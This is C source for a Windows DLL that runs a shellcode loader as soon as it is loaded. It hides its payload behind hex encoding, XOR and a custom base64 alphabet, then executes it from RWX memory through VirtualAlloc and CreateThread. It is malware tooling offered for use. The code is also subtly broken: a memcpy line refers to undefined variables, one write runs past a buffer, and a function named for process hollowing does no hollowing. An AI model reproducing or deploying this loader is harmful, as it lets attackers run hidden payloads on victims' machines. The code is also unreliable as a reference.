#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void xor_decrypt(unsigned char* data, int length, unsigned char key) {
    for (int i = 0; i < length; i++) {
        data[i] ^= key;
    }
}

const char* base64_chars = "ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0987654321+/";

int is_base64(unsigned char c) {
    return (strchr(base64_chars, c) != NULL);
}

int base64_decode(const char* input, unsigned char* output) {
    int len = strlen(input);
    int i = 0, j = 0;
    unsigned char char_array_4[4], char_array_3[3];
    int output_len = 0;
    while (len-- && (input[i] != '=') && is_base64(input[i])) {
        char_array_4[j++] = input[i]; i++;
        if (j == 4) {
            for (j = 0; j < 4; j++) {
                char_array_4[j] = (unsigned char)(strchr(base64_chars, char_array_4[j]) - base64_chars);
            }
            char_array_3[0] = (char_array_4[0] << 2) | (char_array_4[1] >> 4);
            char_array_3[1] = ((char_array_4[1] & 15) << 4) | (char_array_4[2] >> 2);
            char_array_3[2] = ((char_array_4[2] & 3) << 6) | char_array_4[3];

            for (j = 0; j < 3; j++) {
                output[output_len++] = char_array_3[j];
            }
            j = 0;
        }
    }
    return output_len;
}

int hex_decode(const char* hex, unsigned char* output) {
    int len = strlen(hex);
    if (len % 2 != 0) return 0; // Invalid hex length
    for (int i = 0; i < len; i += 2) {
        sscanf(hex + i, "%2hhx", &output[i / 2]);
    }
    return len / 2;
}

void ProcessHollowing() {
    const char* encrypted_hex = "92dcf58585926c7d9e4ddfbc0e0ffe7e3eccf85e0e4d2f3e08593ecf8";
    
    int hex_len = strlen(encrypted_hex) / 2;
    unsigned char* decoded_hex = (unsigned char*)malloc(hex_len);
    if (!decoded_hex) {
        printf("Memory allocation failed.\n");
        return;
    }
    
    int decoded_len = hex_decode(encrypted_hex, decoded_hex);
    if (decoded_len == 0) {
        printf("Hexadecimal decoding failed.\n");
        free(decoded_hex);
        return;
    }

    xor_decrypt(decoded_hex, decoded_len, 0xAA); // Use the same key
    decoded_hex[decoded_len] = '\0';
    
    unsigned char* base64_decoded = (unsigned char*)malloc(decoded_len);
    if (!base64_decoded) {
        printf("Memory allocation failed.\n");
        free(decoded_hex);
        return;
    }

    int shellcode_len = base64_decode((char*)decoded_hex, base64_decoded);
    if (shellcode_len == 0) {
        printf("Base64 decoding failed.\n");
        free(decoded_hex);
        free(base64_decoded);
        return;
    }

    LPVOID allocated_mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (allocated_mem == NULL) {
        printf("Failed to allocate memory in target process: %d\n", GetLastError());
        free(decoded_hex);
        free(base64_decoded);
        return;
    }

    memcpy(execMem, shellcode, shellcodeSize);

    DWORD oldProtect;
    if (!VirtualProtect(allocated_mem, shellcode_len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("Failed to change memory protection: %d\n", GetLastError());
        VirtualFree(allocated_mem, 0, MEM_RELEASE);
        free(decoded_hex);
        free(base64_decoded);
        return;
    }

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread.\n");
        VirtualFree(allocated_mem, 0, MEM_RELEASE);
        return;    }
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(allocated_mem, 0, MEM_RELEASE);
    free(decoded_hex);
    free(base64_decoded);
    printf("Shellcode is ready for execution.\n");
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) { // same as BOOL APIENTRY DllMain(...)
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);  // disable useless thread notifications
        ProcessHollowing();
    }
    return TRUE;
}
